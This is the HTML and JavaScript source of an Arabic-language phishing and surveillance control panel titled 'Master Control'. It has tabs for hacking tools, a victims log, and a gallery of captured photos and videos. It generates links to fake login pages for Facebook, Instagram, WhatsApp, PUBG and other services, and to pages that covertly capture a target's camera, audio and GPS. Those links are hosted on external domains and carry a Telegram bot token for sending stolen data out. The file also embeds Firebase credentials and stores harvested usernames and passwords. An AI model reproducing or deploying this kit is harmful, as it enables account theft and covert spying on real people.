<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ Master Control</title>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <style>
        :root { --red: #ff0040; --gold: #ffaa00; --green: #00ff41; --dark: #0a0000; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Courier New',monospace; background:#000; color:#fff; min-height:100vh; padding:16px; overflow-x:hidden; }
        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
        @keyframes flicker { 0%,100%{opacity:1} 30%{opacity:0.2} 60%{opacity:0.8} }
        @keyframes scanLine { from{top:-100%} to{top:100%} }
        @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
        
        .scan-line { position:fixed;left:0;right:0;height:2px;background:rgba(255,0,0,0.15);pointer-events:none;animation:scanLine 2s linear infinite;z-index:999; }
        
        .container { max-width:500px;margin:0 auto;position:relative;z-index:1; }
        .page { display:none;animation:fadeIn 0.3s ease-out; }
        .page.active { display:block; }
        
        .header { text-align:center;margin-bottom:20px; }
        .skull { font-size:55px;animation:pulse 0.3s infinite;filter:drop-shadow(0 0 20px var(--red)); }
        h1 { font-size:22px;color:var(--red);text-shadow:0 0 30px var(--red);margin:10px 0;letter-spacing:3px; }
        
        .nav { display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap; }
        .nav-btn { flex:1;min-width:50px;padding:10px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:10px;text-align:center; }
        .nav-btn.active { border-color:var(--red);color:var(--red); }
        
        .card { background:var(--dark);border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px; }
        .card h2 { color:var(--gold);font-size:14px;margin-bottom:12px;border-bottom:1px solid #333;padding-bottom:8px; }
        
        .stats-row { display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:16px; }
        .stat-card { background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center; }
        .stat-card .num { color:var(--red);font-size:24px;font-weight:bold; }
        .stat-card .txt { color:#666;font-size:10px;margin-top:4px; }
        
        .log-item { background:#050000;border:1px solid #333;border-radius:8px;padding:12px;margin-bottom:6px; }
        .log-item .time { color:#666;font-size:10px; }
        .log-item .service { color:var(--red);font-size:12px;font-weight:bold; }
        .log-item .data { color:#aaa;font-size:11px;margin-top:4px; }
        
        .gallery-grid { display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px; }
        .gallery-item { aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid #333;cursor:pointer;background:#111;position:relative; }
        .gallery-item img,.gallery-item video { width:100%;height:100%;object-fit:cover; }
        .gallery-item .play-icon { position:absolute;top:5px;left:5px;background:rgba(0,0,0,0.7);color:#fff;padding:2px 6px;border-radius:4px;font-size:10px; }
        
        .tool-grid { display:grid;grid-template-columns:1fr 1fr;gap:8px; }
        .tool-card { background:var(--dark);border:1px solid #333;border-radius:10px;padding:14px;text-align:center;cursor:pointer;font-size:11px; }
        .tool-card:active { border-color:var(--red);transform:scale(0.95); }
        .tool-card .icon { font-size:28px;display:block;margin-bottom:6px; }
        .tool-card.blocked { opacity:0.3;pointer-events:none; }
        
        .modal { display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;padding:20px; }
        .modal.show { display:flex; }
        .modal img,.modal video { max-width:95%;max-height:85vh;border-radius:10px; }
        .modal .close { position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;background:rgba(255,0,0,0.5);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center; }
        
        .input-group { margin-bottom:12px; }
        .input-group input,.input-group select { width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:6px;color:#fff;font-size:13px;font-family:'Courier New',monospace;outline:none; }
        .input-group input:focus { border-color:var(--red); }
        
        .btn { width:100%;padding:14px;border-radius:8px;border:none;font-size:14px;font-weight:bold;cursor:pointer;margin-top:6px; }
        .btn-red { background:#2a0a0a;color:var(--red);border:1px solid var(--red); }
        .btn-gold { background:#0a0a2a;color:var(--gold);border:1px solid var(--gold); }
        .btn:active { transform:scale(0.96); }
        
        .file-zone { border:2px dashed #333;border-radius:12px;padding:25px;text-align:center;cursor:pointer;margin:10px 0; }
        .file-zone:hover { border-color:var(--gold); }
        input[type=file] { display:none; }
        
        .empty { text-align:center;color:#666;padding:30px;font-size:13px; }
        .refresh-btn { width:100%;padding:12px;background:var(--dark);border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:13px;margin-bottom:12px; }
    </style>
</head>
<body>
<div class="scan-line"></div>
<div class="container">

    <div class="header">
        <div class="skull">💀</div>
        <h1>MASTER CONTROL</h1>
    </div>

    <div class="nav">
        <button class="nav-btn active" onclick="showTab('tools')">🛠️ أدوات</button>
        <button class="nav-btn" onclick="showTab('upload')">📤 رفع</button>
        <button class="nav-btn" onclick="showTab('dashboard')">📊 لوحة</button>
        <button class="nav-btn" onclick="showTab('victims')">👥 ضحايا</button>
        <button class="nav-btn" onclick="showTab('gallery')">📸 معرض</button>
    </div>

    <!-- الأدوات -->
    <div class="page active" id="tab-tools">
        <div class="card"><h2>🛠️ أدوات الاختراق</h2>
        <div class="tool-grid" id="tools-grid"></div></div>
    </div>

    <!-- رفع -->
    <div class="page" id="tab-upload">
        <div class="card"><h2>📤 رفع صورة أو فيديو</h2>
        <input type="file" id="uploadFile" accept="image/*,video/*" onchange="previewUpload()">
        <div class="file-zone" onclick="document.getElementById('uploadFile').click()">
            <div style="font-size:40px;">📤</div>
            <div style="color:#666;font-size:13px;margin-top:8px;">اضغط لاختيار صورة أو فيديو</div>
        </div>
        <div id="uploadPreview" style="margin-top:10px;text-align:center;"></div>
        <button class="btn btn-gold" onclick="uploadMedia()">📤 رفع للمعرض</button></div>
        
        <div class="card"><h2>📝 إضافة بيانات حساب</h2>
        <div class="input-group">
            <select id="v-service" style="margin-bottom:8px;">
                <option value="">اختر النوع</option>
                <option>فيسبوك</option><option>انستجرام</option><option>واتساب</option>
                <option>تويتر</option><option>سناب</option><option>تيك توك</option>
                <option>PUBG</option><option>فري فاير</option>
            </select>
            <input type="text" id="v-user" placeholder="اسم المستخدم / الإيميل" style="margin-bottom:8px;">
            <input type="password" id="v-pass" placeholder="كلمة المرور">
        </div>
        <button class="btn btn-red" onclick="saveVictim()">📝 حفظ في السجل</button></div>
    </div>

    <!-- لوحة -->
    <div class="page" id="tab-dashboard">
        <div class="stats-row">
            <div class="stat-card"><div class="num" id="s-victims">0</div><div class="txt">ضحايا</div></div>
            <div class="stat-card"><div class="num" id="s-photos">0</div><div class="txt">صور</div></div>
            <div class="stat-card"><div class="num" id="s-videos">0</div><div class="txt">فيديو</div></div>
        </div>
        <button class="refresh-btn" onclick="loadDashboard()">🔄 تحديث</button>
        <div class="card"><h2>🕐 آخر النشاطات</h2><div id="recent-logs"></div></div>
    </div>

    <!-- ضحايا -->
    <div class="page" id="tab-victims">
        <button class="refresh-btn" onclick="loadVictims()">🔄 تحديث</button>
        <div class="card"><h2>👥 سجل الضحايا</h2><div id="victims-list"></div></div>
    </div>

    <!-- معرض -->
    <div class="page" id="tab-gallery">
        <button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
        <div class="card"><h2>📸 المعرض</h2><div class="gallery-grid" id="gallery-grid"></div></div>
    </div>
</div>

<div class="modal" id="modal" onclick="closeModal()">
    <span class="close">✕</span>
    <img id="modalImg" src="" style="display:none;">
    <video id="modalVid" controls style="display:none;"></video>
</div>

<script>
var db;
var remoteCodes = {admin:true, elgen:true};
var blockedTools = [];
var API = 'https://pubgskin.vercel.app/api/save';

// Firebase
firebase.initializeApp({
    apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
    projectId: "game-a1aca",
    storageBucket: "game-a1aca.firebasestorage.app",
    appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
});
db = firebase.firestore();

// ========== تبويبات ==========
function showTab(tab) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + tab).classList.add('active');
    var tabs = ['tools','upload','dashboard','victims','gallery'];
    var i = tabs.indexOf(tab);
    if (i >= 0) document.querySelectorAll('.nav-btn')[i].classList.add('active');
    
    if (tab === 'dashboard') loadDashboard();
    if (tab === 'victims') loadVictims();
    if (tab === 'gallery') loadGallery();
    if (tab === 'tools') loadTools();
}

// ========== Firebase ==========
async function loadFirebaseConfig() {
    try {
        var doc = await db.collection('config').doc('settings').get();
        if (doc.exists) {
            var data = doc.data();
            if (data.codes) remoteCodes = data.codes;
            if (data.blocked_tools) blockedTools = data.blocked_tools;
        }
    } catch(e) {}
}

function isValidCode(code) { return remoteCodes[code] === true; }

// ========== تخزين البيانات ==========
function saveToLocal(type, data) {
    var storage = JSON.parse(localStorage.getItem('mc_data') || '{"victims":[],"gallery":[],"videos":[]}');
    data.timestamp = new Date().toISOString();
    if (type === 'victim') storage.victims.push(data);
    if (type === 'photo') storage.gallery.push(data);
    if (type === 'video') storage.videos.push(data);
    localStorage.setItem('mc_data', JSON.stringify(storage));
}

function getLocalData() {
    return JSON.parse(localStorage.getItem('mc_data') || '{"victims":[],"gallery":[],"videos":[]}');
}

// ========== لوحة ==========
function loadDashboard() {
    var data = getLocalData();
    var victims = data.victims || [];
    var gallery = data.gallery || [];
    var videos = data.videos || [];
    
    document.getElementById('s-victims').textContent = victims.length;
    document.getElementById('s-photos').textContent = gallery.length;
    document.getElementById('s-videos').textContent = videos.length;
    
    var all = [];
    victims.forEach(v => all.push({time:v.timestamp, service:v.service, text:v.text}));
    gallery.forEach(g => all.push({time:g.timestamp, service:'📸 صورة', text:g.caption}));
    videos.forEach(v => all.push({time:v.timestamp, service:'🎬 فيديو', text:v.caption}));
    all.sort((a,b) => new Date(b.time) - new Date(a.time));
    
    var html = '';
    all.slice(0,10).forEach(a => {
        html += '<div class="log-item"><div class="time">🕐 ' + (a.time ? new Date(a.time).toLocaleString('ar-EG') : '') + '</div><div class="service">' + a.service + '</div><div class="data">' + (a.text || '') + '</div></div>';
    });
    document.getElementById('recent-logs').innerHTML = html || '<div class="empty">لا توجد سجلات</div>';
}

// ========== ضحايا ==========
function loadVictims() {
    var data = getLocalData();
    var html = '';
    (data.victims || []).reverse().forEach(v => {
        html += '<div class="log-item"><div class="time">🕐 ' + (v.timestamp ? new Date(v.timestamp).toLocaleString('ar-EG') : '') + '</div><div class="service">' + (v.service || '') + '</div><div class="data">' + (v.text || '') + '</div></div>';
    });
    document.getElementById('victims-list').innerHTML = html || '<div class="empty">لا يوجد ضحايا</div>';
}

// ========== معرض ==========
function loadGallery() {
    var data = getLocalData();
    var html = '';
    
    (data.gallery || []).reverse().forEach(g => {
        if (g.url) {
            html += '<div class="gallery-item" onclick="openMedia(\'' + g.url + '\',\'image\')"><img src="' + g.url + '" alt=""></div>';
        }
    });
    
    (data.videos || []).reverse().forEach(v => {
        if (v.url) {
            html += '<div class="gallery-item" onclick="openMedia(\'' + v.url + '\',\'video\')"><video src="' + v.url + '"></video><div class="play-icon">▶</div></div>';
        }
    });
    
    document.getElementById('gallery-grid').innerHTML = html || '<div class="empty">📭 المعرض فارغ</div>';
}

function openMedia(url, type) {
    if (type === 'video') {
        document.getElementById('modalImg').style.display = 'none';
        document.getElementById('modalVid').style.display = 'block';
        document.getElementById('modalVid').src = url;
    } else {
        document.getElementById('modalVid').style.display = 'none';
        document.getElementById('modalImg').style.display = 'block';
        document.getElementById('modalImg').src = url;
    }
    document.getElementById('modal').classList.add('show');
}

function closeModal() {
    document.getElementById('modal').classList.remove('show');
    document.getElementById('modalVid').pause();
}

// ========== أدوات ==========
function loadTools() {
    var tools = [
        {name:'كاميرا أمامية',icon:'📸',page:'photo-front.html'},
        {name:'كاميرا خلفية',icon:'📷',page:'photo-back.html'},
        {name:'فيديو أمامي',icon:'🎥',page:'mm.html'},
        {name:'فيديو خلفي',icon:'📹',page:'video-back.html'},
        {name:'GPS',icon:'📍',page:'location.html'},
        {name:'صوت',icon:'🎙️',page:'audio.html'},
        {name:'فيسبوك',icon:'📘',page:'fb.html'},
        {name:'انستجرام',icon:'📷',page:'insta.html'},
        {name:'واتساب',icon:'💬',page:'whatsapp.html'},
        {name:'تويتر',icon:'𝕏',page:'twitter.html'},
        {name:'سناب',icon:'👻',page:'snapchat.html'},
        {name:'تيك توك',icon:'🎵',page:'tiktok.html'},
        {name:'PUBG',icon:'🔫',page:'g.html'},
        {name:'فري فاير',icon:'🎯',page:'freefire.html'},
        {name:'ديسكورد',icon:'💎',page:'discord.html'},
        {name:'بث مباشر',icon:'🎥',page:'live.html'}
    ];
    
    var html = '';
    tools.forEach(t => {
        var isBlocked = blockedTools.indexOf(t.page) !== -1;
        html += '<div class="tool-card' + (isBlocked ? ' blocked' : '') + '" onclick="' + (isBlocked ? '' : 'copyToolLink(\'' + t.page + '\')') + '"><span class="icon">' + t.icon + '</span>' + t.name + (isBlocked ? ' 🔒' : '') + '</div>';
    });
    document.getElementById('tools-grid').innerHTML = html;
}

function copyToolLink(page) {
    var base = (['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','g.html','fb.html','insta.html','whatsapp.html','twitter.html','snapchat.html','tiktok.html'].indexOf(page) !== -1) ? 'https://ai-proxy-eosin.vercel.app' : 'https://pubgskin.vercel.app';
    var link = base + '/' + page + '?chatId=7276604783&token=8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
    navigator.clipboard.writeText(link).then(() => alert('✅ تم نسخ الرابط!')).catch(() => prompt('انسخ:', link));
}

// ========== رفع ==========
function previewUpload() {
    var f = document.getElementById('uploadFile').files[0];
    if (!f) return;
    var reader = new FileReader();
    reader.onload = function(e) {
        var html = f.type.startsWith('image/') ? '<img src="' + e.target.result + '" style="max-width:100%;max-height:200px;border-radius:8px;">' : '<video src="' + e.target.result + '" controls style="max-width:100%;max-height:200px;border-radius:8px;"></video>';
        document.getElementById('uploadPreview').innerHTML = html;
    };
    reader.readAsDataURL(f);
}

async function uploadMedia() {
    var f = document.getElementById('uploadFile').files[0];
    if (!f) return alert('اختر ملف');
    
    var reader = new FileReader();
    reader.onload = function(e) {
        var isVideo = f.type.startsWith('video/');
        saveToLocal(isVideo ? 'video' : 'photo', {
            url: e.target.result,
            caption: isVideo ? '🎬 فيديو مرفوع' : '📸 صورة مرفوعة',
            service: isVideo ? '🎬 فيديو' : '📸 صورة'
        });
        alert('✅ تم الرفع! الملف في المعرض');
        document.getElementById('uploadFile').value = '';
        document.getElementById('uploadPreview').innerHTML = '';
    };
    reader.readAsDataURL(f);
}

// ========== حفظ بيانات ==========
function saveVictim() {
    var service = document.getElementById('v-service').value;
    var user = document.getElementById('v-user').value.trim();
    var pass = document.getElementById('v-pass').value.trim();
    if (!service || !user || !pass) return alert('املأ جميع الحقول');
    
    saveToLocal('victim', {
        service: service,
        text: '👤 ' + user + ' | 🔒 ' + pass
    });
    
    alert('✅ تم الحفظ في السجل!');
    document.getElementById('v-user').value = '';
    document.getElementById('v-pass').value = '';
}

// ========== بدء ==========
loadFirebaseConfig();
loadTools();
</script>
</body>
</html>
